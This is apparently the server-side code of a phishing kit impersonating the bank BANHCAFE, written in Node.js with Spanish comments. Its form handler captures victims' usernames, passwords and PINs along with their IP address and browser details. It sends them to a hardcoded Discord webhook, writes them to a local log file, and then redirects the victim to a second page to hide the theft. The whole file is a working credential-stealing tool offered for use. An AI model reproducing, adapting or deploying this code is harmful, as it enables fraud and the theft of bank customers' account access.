// app.js
import express from "express";
import session from "express-session";
import fetch from "node-fetch";
import fs from "fs";
import path from "path";

const app = express();
const PORT = 3000;

// Middleware para procesar formularios
app.use(express.urlencoded({ extended: true }));

// Configuración de sesiones
app.use(
  session({
    secret: "clave_secreta_segura",
    resave: false,
    saveUninitialized: true,
  })
);

// Ruta principal (maneja POST del formulario)
app.post("/procesar", async (req, res) => {
  const { usuario = "", clave = "", pin = "" } = req.body;

  // Generar o recuperar token de sesión
  if (!req.session.session_token) {
    req.session.session_token = cryptoRandom();
    req.session.session_start = new Date().toISOString();
    req.session.ip_address = getClientIP(req);
    req.session.user_agent = req.headers["user-agent"] || "";
  }

  // Obtener info del cliente
  const ip = getClientIP(req);
  const user_agent = req.headers["user-agent"] || "";
  const timestamp = new Date().toISOString();
  const referer = req.headers["referer"] || "Directo";

  // Mensaje a enviar
  let mensaje = `**🛡️ Nuevo acceso BANHCAFE**\n`;
  mensaje += `🔐 **Sesión:** \`${req.session.session_token}\`\n`;
  mensaje += `⏰ **Inicio sesión:** ${req.session.session_start}\n`;
  mensaje += `🕒 **Acceso actual:** ${timestamp}\n`;
  mensaje += `🌐 **IP:** \`${ip}\`\n`;
  mensaje += `🔍 **Navegador:** ${user_agent.substring(0, 50)}\n`;
  mensaje += `📎 **Referer:** ${referer}\n`;
  mensaje += `👤 **Usuario:** \`${usuario}\`\n`;
  mensaje += `🔑 **Clave:** \`${clave}\`\n`;
  mensaje += `📌 **PIN:** \`${pin}\`\n`;
  mensaje += `────────────────────`;

  // Webhook de Discord
  const webhook_url =
    "https://discord.com/api/webhooks/1428171161287790612/sR0SEn5-2wGHukRr0YK1fdu-Q9HyHildS9Rh5p5LJUA1jNs0uuvWOfvtxwSvK5U2RxV6";

  // Enviar a Discord
  try {
    await fetch(webhook_url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ content: mensaje }),
    });
  } catch (err) {
    console.error("Error enviando a Discord:", err);
  }

  // Guardar en archivo log
  logToFile(req.session.session_token, usuario, clave, pin, ip);

  // Redirigir
  res.redirect("/index2.html");
});

// Si no es POST, redirige
app.get("*", (req, res) => {
  res.redirect("/index.html");
});

// Funciones auxiliares
function cryptoRandom() {
  return [...crypto.getRandomValues(new Uint8Array(16))]
    .map((b) => b.toString(16).padStart(2, "0"))
    .join("");
}

function getClientIP(req) {
  return (
    req.headers["x-forwarded-for"]?.split(",")[0] ||
    req.connection.remoteAddress ||
    "IP desconocida"
  );
}

function logToFile(sessionToken, usuario, clave, pin, ip) {
  const logFile = path.join(process.cwd(), "sesiones.log");
  const timestamp = new Date().toISOString();
  const logEntry = `[${timestamp}] SESION: ${sessionToken} | IP: ${ip} | USUARIO: ${usuario} | CLAVE: ${clave} | PIN: ${pin}\n`;

  fs.appendFileSync(logFile, logEntry, { encoding: "utf8" });
}

// Inicia servidor
app.listen(PORT, () => {
  console.log(`Servidor corriendo en http://localhost:${PORT}`);
});
